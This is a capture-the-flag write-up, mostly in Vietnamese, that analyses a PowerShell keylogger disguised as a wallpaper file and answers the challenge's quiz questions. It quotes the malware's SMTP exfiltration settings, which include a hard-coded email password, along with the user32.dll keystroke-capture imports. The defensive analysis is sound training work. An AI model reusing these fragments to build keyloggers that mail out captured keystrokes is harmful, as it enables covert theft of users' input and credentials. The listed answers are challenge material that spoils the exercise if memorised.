## Description
> A suspicious PowerShell script was found on one of our endpoints. Can you work out what it does?
## Link challenge
> https://blueteamlabs.online/home/challenge/powershell-analysis-keylogger-9f4ab9a11c
## Solution
***Câu 1 : What is the SHA256 hash value for the PowerShell script file?***
- Sau khi tải file về và giải nén em thu được 1 tệp tên `HDWallpaperEngine.txt` bên trong chứa các lệnh thực thi powershell
```
┌──(kali㉿kali)-[~/Downloads]
└─$ sha256sum HDWallpaperEngine.txt 
e0b7a2ad2320ac32c262aeb6fe2c6c0d75449c6e34d0d18a531157c827b9754e  HDWallpaperEngine.txt
```
> A : e0b7a2ad2320ac32c262aeb6fe2c6c0d75449c6e34d0d18a531157c827b9754e

***Câu 2 : What email address is used to send and receive emails?***
- Quan sát nội dung bên trong 
```
$TimesToRun = 2
$RunTimeP = 1
$From = "chaudhariparth454@gmail.com"
$Pass = "yjghfdafsd5464562!"
$To = "chaudhariparth454@gmail.com"
$Subject = "Keylogger Results"
$body = "Keylogger Results"
$SMTPServer = "smtp.mail.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
```
- Có thể thấy địa chỉ email là chaudhariparth454@gmail.com
> A : chaudhariparth454@gmail.com
***Câu 3 : What is the password for this email account?***
- Tương tự tại dòng thứ 4 
> A : yjghfdafsd5464562!
***Câu 4 : What port is used for SMTP?***
- Kết quả nằm ở dòng thứ 9 : `$SMTPPort = "587"`
> A : 587
***Câu 5 : What DLL is imported to help record keystrokes?***
- Tại đây `function Start-KeyLogger($Path="$env:temp\keylogger.txt") `, `$env:temp:` Biến môi trường này trỏ đến thư mục tạm thời của hệ thống và `keylogger.txt`: Tên tệp văn bản sẽ lưu trữ các phím bấm.
- Ta lại thấy
```
 # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
```
- [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]: Khai báo sử dụng hàm từ user32.dll, tự động chọn CharSet.
- public static extern short GetAsyncKeyState(int virtualKeyCode);: Khai báo hàm trả về kiểu short (số nguyên ngắn) và nhận một tham số virtualKeyCode kiểu int (số nguyên).
- Chức năng: Hàm này kiểm tra trạng thái của một phím ảo (virtual key) cụ thể, cho biết phím đó có đang được nhấn hay không.
> A : user32.dll
***Câu 6 : What directory is the generated txt file put in?***
- Như đã giải thích ở trên tệp sẽ được lưu vào temp
> A : temp

